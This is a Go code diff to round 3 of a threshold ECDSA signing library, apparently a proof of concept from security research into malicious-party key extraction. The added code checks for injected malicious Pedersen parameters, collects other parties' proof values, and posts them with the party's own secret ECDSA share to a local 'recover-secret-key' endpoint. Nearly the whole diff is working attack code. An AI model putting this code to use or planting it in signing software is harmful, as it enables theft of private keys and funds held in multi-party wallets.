@@ -11,6 +11,13 @@ import (
 	"github.com/taurusgroup/multi-party-sig/pkg/party"
 	zkaffg "github.com/taurusgroup/multi-party-sig/pkg/zk/affg"
 	zklogstar "github.com/taurusgroup/multi-party-sig/pkg/zk/logstar"
+
+	"bytes"
+	"encoding/json"
+	"github.com/taurusgroup/multi-party-sig/verichains"
+	"log"
+	"math/big"
+	"net/http"
 )
 
 var _ round.Round = (*round3)(nil)
@@ -26,6 +33,8 @@ type round3 struct {
 	ChiShareAlpha map[party.ID]*safenum.Int
 	// ChiShareBeta[j] = β̂ᵢⱼ
 	ChiShareBeta map[party.ID]*safenum.Int
+
+	collected []*big.Int
 }
 
 type message3 struct {
@@ -80,6 +89,32 @@ func (r *round3) VerifyMessage(msg round.Message) error {
 		return errors.New("failed to validate affg proof for Delta MtA")
 	}
 
+	if r.Malicious() {
+		params := verichains.DefaultMaliciousParams()
+		if params.H1.Eq(r.Pedersen[r.SelfID()].S()) != 1 {
+			goto NotInjected
+		}
+		if r.collected == nil {
+			log.Println("Collecting data...")
+			r.collected = make([]*big.Int, 0)
+		}
+		r.collected = append(r.collected, body.ChiProof.S.Big())
+		if len(r.collected) == r.Threshold() {
+			buf := &bytes.Buffer{}
+			if err := json.NewEncoder(buf).Encode(map[string]interface{}{
+				"self_w": curve.MakeInt(r.SecretECDSA).Big(),
+				"zs":     r.collected,
+				"pkx":    curve.MakeInt(r.PublicKey.XScalar()).Big(),
+			}); err != nil {
+				log.Fatal(err)
+			}
+
+			go http.Post("http://localhost:1337/recover-secret-key", "application/json", buf)
+			log.Println("Data sent!")
+		}
+	}
+
+NotInjected:
 	if !body.ChiProof.Verify(r.HashForID(from), zkaffg.Public{
 		Kv:       r.K[to],
 		Dv:       body.ChiD,
